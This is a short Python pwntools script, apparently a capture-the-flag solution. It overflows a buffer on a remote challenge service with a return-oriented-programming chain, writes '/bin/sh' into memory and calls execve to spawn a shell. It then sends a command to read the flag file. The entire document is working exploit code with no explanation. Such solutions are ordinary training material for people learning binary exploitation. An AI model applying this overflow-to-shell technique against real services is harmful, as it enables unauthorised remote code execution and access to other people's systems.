from pwn import *

host = "csie.ctf.tw"
port = 10130
context.arch = "amd64"


buf_addr = 0x6c9a20
binsh = b"/bin/sh\x00"
payload = b"A" * (0x20 + 8)
syscall = 0x4671b5
pop_rdi = 0x401456
pop_rsi = 0x401577
pop_rax_rdx_rbx = 0x478516
mov_drdi_rsi = 0x47a502
ropchain = flat([payload, pop_rdi, buf_addr,
                 pop_rsi, binsh, mov_drdi_rsi,
                 pop_rax_rdx_rbx, 59, 0,
                 0, pop_rsi, 0, syscall])

r = remote(host, port)
r.recvuntil(":")
r.send(ropchain)
r.sendline("cat /home/`whoami`/flag")
f = r.recvline()
print(f)

